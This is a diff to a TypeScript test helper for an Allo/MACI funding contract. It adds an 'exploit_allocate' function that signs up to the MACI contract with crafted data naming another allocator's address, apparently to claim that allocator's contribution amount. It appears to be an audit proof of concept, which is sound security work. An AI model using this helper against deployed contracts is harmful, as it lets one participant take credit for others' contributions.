@@ -1,7 +1,5 @@
-import { Signer } from "ethers";
-import {
-  Allo
-} from "../../typechain-types";
+import { AbiCoder, BytesLike, Signer } from "ethers";
+import { Allo, ClonableMACI } from "../../typechain-types";
 
 import { Keypair } from "maci-domainobjs";
 import { prepareAllocationData } from "./maci";
@@ -45,4 +43,32 @@ export const allocate = async ({
     { value: contributionAmount.toString() }
   );
   await SignUpTx.wait();
+};
+
+export const exploit_allocate = async ({
+  MACIContract,
+  allocator,
+  keypair,
+  allocatorToGetFromHisContributionAmount,
+}: {
+  keypair: Keypair;
+  MACIContract: ClonableMACI;
+  allocator: Signer;
+  allocatorToGetFromHisContributionAmount: string;
+}) => {
+  let types = ["address"];
+
+  const data = AbiCoder.defaultAbiCoder().encode(types, [
+    allocatorToGetFromHisContributionAmount,
+  ]);
+
+  const SignUpTx = MACIContract.connect(allocator).signUp(
+    {
+      x: keypair.pubKey.asContractParam().x as bigint,
+      y: keypair.pubKey.asContractParam().y as bigint,
+    },
+    data as BytesLike,
+    data as BytesLike
+  );
+  return SignUpTx;
 };
